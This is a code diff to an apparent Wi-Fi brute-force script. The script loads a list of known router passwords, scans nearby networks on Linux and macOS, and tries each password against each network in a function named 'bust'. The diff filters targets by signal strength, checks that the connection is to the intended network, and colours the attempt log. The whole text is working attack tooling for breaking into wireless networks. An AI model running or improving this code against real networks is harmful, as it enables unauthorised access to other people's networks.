@@ -10,6 +10,15 @@ passwords_file = os.path.join(main_directory, "known_credentials", "router")
 with open(passwords_file, "r") as file:
     passwords = file.read().splitlines()
 
+MINIMUM_SIGNAL_STRENGTH = -70
+
+def is_int(string):
+    try:
+        int(string)
+        return True
+    except ValueError:
+        return False
+
 # Get a list of networks available to the device.
 def get_networks(os_name):
     output = None
@@ -20,7 +29,7 @@ def get_networks(os_name):
         list_networks_command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"
         output = subprocess.check_output(list_networks_command, shell=True, text=True)
         lines = output.split("\n")
-        output = [re.split("  +", line)[1] for line in lines if len(re.split("  +", line)) > 2]
+        output = [re.split("  +", line)[1] for line in lines if len(re.split("  +", line)) > 2 and is_int(re.split("  +", line)[2]) and int(re.split("  +", line)[2]) > MINIMUM_SIGNAL_STRENGTH]
     else:
         print("Unsupported OS")
     return output
@@ -38,14 +47,14 @@ def connect_to_network(ssid, password, os_name):
 
 # Check if the device is connected to a network.
 # Returns True if connected, otherwise False.
-def is_connected(os_name):
+def is_connected(network, os_name):
     flag = False
     if os_name == "Linux":
         output = subprocess.check_output("nmcli device show wlan0", shell=True, text=True)
-        flag = "GENERAL.STATE: connected" in output
+        flag = f"GENERAL.STATE: connected to {network}" in output
     elif os_name == "Darwin":
         output = subprocess.check_output("networksetup -getairportnetwork en0", shell=True, text=True)
-        flag = "Current Wi-Fi Network: " in output
+        flag = f"Current Wi-Fi Network: {network}" in output
     else:
         print("Unsupported OS")
     return flag
@@ -60,13 +69,13 @@ def bust():
     if len(networks) > 0:
         for network in networks:
             for password in passwords:
-                print(f"Attempting to join \"{network}\" using password \"{password}\"...")
+                print(f"Attempting to join {colored(network, 'cyan')} using password {colored(password, 'blue')}...")
                 connect_to_network(network, password, os_name)
-                if is_connected(os_name):
-                    print(colored(f"Connected to network {network} using \"{password}\".", "green"))
+                if is_connected(network, os_name):
+                    print(colored(f"Connected to network {network}.", "green"))
                     return True
                 else:
-                    print(colored(f"Could not connect to network {network} using \"{password}\".", "red"))
+                    print(colored(f"Could not connect.", "red"))
                 print("")
     else:
         print("No networks found.")
